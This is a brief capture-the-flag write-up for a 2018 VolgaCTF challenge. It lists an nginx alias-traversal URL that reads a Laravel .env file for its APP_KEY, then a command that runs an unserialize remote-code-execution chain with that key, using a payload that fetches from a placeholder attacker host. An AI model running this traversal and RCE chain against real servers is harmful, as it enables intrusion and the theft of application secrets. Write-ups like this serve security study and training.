# Forgotten Task Writeup

1) Get APP_KEY via nginx [alias_traversal](https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md)

`http://forgotten-task.quals.2018.volgactf.ru/laravel../.env`

2) Create session with unserialize RCE chain

`php laravel_attack.php base64:BTyS9a35xfMVYrNkvo8j0MClde4Jk6Tl/e+/+UCEyWA= "file_get_contents('http://attacker_site/rce_test');"`